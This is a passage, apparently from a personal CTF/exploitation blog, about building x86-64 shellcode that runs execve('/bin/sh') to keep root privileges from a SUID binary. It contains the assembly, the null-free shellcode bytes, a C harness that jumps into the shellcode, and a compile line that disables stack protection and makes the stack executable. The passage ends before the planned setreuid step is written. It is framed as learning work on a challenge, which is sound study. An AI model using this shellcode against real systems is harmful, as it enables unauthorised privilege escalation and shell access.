# Creating a reuid(0,0) execve("/bin/sh") shellcode

# Introduction
I was sitting the other day, struggling with getting a root shell on a challenge. The concept of the challenge was simple. You got SSH credentials and there was a binary file owned by root, with the SUID bit set.

If you just do an execve("/bin/sh") on this binary, your shell will just drop privileges and you will end up with a normal user shell.

Calling setuid(0) did absolutely nothing for me and I still ended up with a normal user shell.

Although this challenge wasn't quite intended to be solved by getting a root shell. I was determined to do so and found out that you can call execve on /bin/sh with the -p parameter. And I created an exploit that did exactly this.

After discussing my overly complicated exploit with a friend, it turned out that I had gotten the idea completely wrong.

To keep privileges in the shell you just need to make sure that the uid is set to 0 and the euid is set to 0.

I looked around on http://shell-storm.org/shellcode/ and realized that although there are shellcodes which call /bin/sh with setuid(0). There are none which call /bin/sh with both setuid(0) and seteuid(0). They do however exist for ash, bash etc..

So I decided that I would like to write my own

# Writing the shell code
I decided to write just the execve("/bin/sh") part first, as I have done this before.

This is what I ended up with:

```C
xor rax, rax //Empty rax register
add rax, 0x3b //Move in execve byte
xor rsi, rsi // empty rsi register
xor rdx,rdx //empty rdx register
mov rbx, 0x68732f6e69622f2f //move "//bin/sh" into rbx
shr rbx, 8 //Change "//bin/sh" to "/bin/sh"
push rbx //Push /bin/sh onto the stack
mov rdi, rsp // move the pointer to /bin/sh on the stack into rdi
syscall //Call it
```
I use https://defuse.ca/online-x86-assembler.htm#disassembly to turn my assembly into shellcode which gives me:
```
\x48\x31\xC0\x48\x83\xC0\x3B\x48\x31\xF6\x48\x31\xD2\x48\xBB\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x0F\x05
```
I got what I need to set the different registers to from the following syscall table: https://filippo.io/linux-syscall-table/

A couple of things to note about the shellcode:
1) I only push to the stack once. I like to push as little as possible to the stack, in case my stack pointer will be on top of my executable code (this can happen if you sigret for example)

2) I empty all the registers, even though it might be initialized to 0 when I jump on the stack. This makes the shellcode versatile and makes it able to be used for other exploits as well.

3) There are no null bytes in the shellcode. Again this makes it way more versatile as a lot of input functions read until they receive a null byte.

I then decided to test my shellcode. I didn't have a copy of the old binary file laying around so I decided to create a test binary which just executes my shellcode for me

I can not take credit for the testing code. The code is taken from https://gist.github.com/securitytube/5318838 where I've only done slight modifications:

```C
#include<stdio.h>
#include<string.h>


int main(void)
{
	unsigned char code[] = "\x48\x31\xC0\x48\x83\xC0\x3B\x48\x31\xF6\x48\x31\xD2\x48\xBB\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x0F\x05";
  printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```
Modifications are:

1) Moving code string inside the main loop to make sure it's on the stack instead of in a section for global variable in the compiled binary

2) Changing the char code to my own payload

I then compiled it with:
```
gcc shellcodetester.c -o test1 -fno-stack-protector -z execstack -no-pie
```
And ran the following linux commands on the compiled binary to give it suid bit and make it owned by root:

```bash
sudo chown 0:0 ./test1
sudo chmod u+s ./test1
```

Running the binary we get a shell but only with normal user privileges:
![alt text](https://github.com/Mymaqn/roadtopwn/tree/main/shellcode/Creating_reuid_execve_shellcode/shellrun1.png)
